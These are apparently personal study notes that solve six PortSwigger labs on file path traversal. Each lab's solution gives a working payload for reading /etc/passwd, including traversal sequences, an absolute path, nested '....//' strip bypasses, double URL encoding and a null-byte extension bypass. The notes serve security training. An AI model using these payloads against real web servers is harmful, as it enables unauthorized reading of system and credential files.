# Table of Contents

- [[#File path traversal, simple case]]
- [[#File path traversal, traversal sequences blocked with absolute path bypass]]
- [[#File path traversal, traversal sequences stripped non-recursively]]
- [[#File path traversal, traversal sequences stripped with superfluous URL-decode]]
- [[#File path traversal, validation of start of path]]
- [[#File path traversal, validation of file extension with null byte bypass]]
- _**[[#Payloads]]**_


# File path traversal, simple case
Reference: https://portswigger.net/web-security/file-path-traversal/lab-simple

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
	~~~
	../../../etc/passwd
	~~~
1. Observe that the response contains the contents of the ``/etc/passwd`` file.
```

# File path traversal, traversal sequences blocked with absolute path bypass
Reference: https://portswigger.net/web-security/file-path-traversal/lab-absolute-path-bypass

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value ``/etc/passwd``.
3. Observe that the response contains the contents of the ``/etc/passwd`` file.
```

# File path traversal, traversal sequences stripped non-recursively
Reference: https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
	~~~
	....//....//....//etc/passwd
	~~~
1. Observe that the response contains the contents of the ``/etc/passwd`` file.
```

# File path traversal, traversal sequences stripped with superfluous URL-decode
Reference: https://portswigger.net/web-security/file-path-traversal/lab-superfluous-url-decode

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
	~~~
	..%252f..%252f..%252fetc/passwd
	~~~
1. Observe that the response contains the contents of the ``/etc/passwd`` file.
```

# File path traversal, validation of start of path
Reference: https://portswigger.net/web-security/file-path-traversal/lab-validate-start-of-path

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
	~~~
	/var/www/images/../../../etc/passwd
	~~~
1. Observe that the response contains the contents of the ``/etc/passwd`` file.
```

# File path traversal, validation of file extension with null byte bypass
Reference: https://portswigger.net/web-security/file-path-traversal/lab-validate-file-extension-null-byte-bypass

```ad-done
title: Solution
1. Use Burp Suite to intercept and modify a request that fetches a product image.
2. Modify the ``filename`` parameter, giving it the value:
	~~~
	../../../etc/passwd%00.png
	~~~
1. Observe that the response contains the contents of the ``/etc/passwd`` file.
```

# Payloads
![[FilePathTraversal]]